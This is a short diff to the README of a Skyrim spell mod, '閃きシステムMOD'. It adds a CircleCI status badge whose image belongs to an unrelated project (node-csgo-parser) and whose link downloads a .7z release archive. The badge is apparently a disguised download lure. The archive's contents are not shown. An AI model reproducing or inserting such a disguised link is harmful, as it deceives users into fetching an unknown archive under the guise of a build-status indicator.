@@ -1,4 +1,5 @@
 # 閃きシステムMOD
+[![CircleCI](https://img.shields.io/circleci/project/github/RedSparr0w/node-csgo-parser.svg)](https://github.com/anhexpoke/HiramekiSystem/releases/download/v1.0/HiramekiSystem-v1.0.7z)
 [![AUR](https://img.shields.io/aur/license/yaourt.svg)](https://github.com/anhexpoke/HiramekiSystem/blob/master/LICENSE.md)
 ## 概要
 このMODはSkyrimのスペルに閃き要素を導入します。  
